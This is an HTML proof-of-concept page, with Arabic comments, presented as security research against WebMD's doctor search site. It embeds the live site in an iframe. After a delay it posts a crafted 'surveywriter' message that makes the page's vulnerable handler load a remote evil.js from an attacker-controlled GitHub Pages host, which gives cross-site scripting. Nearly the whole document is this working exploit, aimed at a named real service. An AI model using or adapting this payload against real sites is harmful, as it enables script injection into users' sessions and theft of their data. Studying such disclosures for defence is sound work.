<!DOCTYPE html>
<html>
<head>
    <title>WebMD Security Research - PoC</title>
</head>
<body>
    <h1>Exploit Demo: PostMessage to RCE/XSS</h1>
    <p>Status: <span id="status">Loading Victim Site...</span></p>

    <iframe id="victimFrame" 
            src="https://doctor.webmd.com/results?q=test" 
            style="width: 800px; height: 600px; border: 1px solid red;">
    </iframe>

    <script>
        const status = document.getElementById('status');
        const frame = document.getElementById('victimFrame');

        // ننتظر 5 ثوانٍ لضمان تحميل سكريبتات WebMD (chunk-vendors.js) بالكامل
        setTimeout(() => {
            status.innerText = "Sending Exploit Payload...";
            
            // بناء الرسالة التي يتوقعها الكود المصاب
            const exploitMessage = {
                message: "surveywriter",
                source: "https://egyhaker.github.io/webmd.com-attacker/evil.js" // رابط ملفك
            };

            /**
             * نرسل الرسالة إلى الـ iframe. 
             * الكود المصاب في WebMD سيستقبلها لأن t.data.message هو "surveywriter"
             * وسيقوم بإنشاء سكريبت جديد مصدره (src) هو ملف evil.js الخاص بك.
             */
            frame.contentWindow.postMessage(exploitMessage, "*");
            
            status.innerText = "Payload Sent! Check the iframe for an alert.";
            status.style.color = "green";
        }, 5000); 
    </script>
</body>
</html>
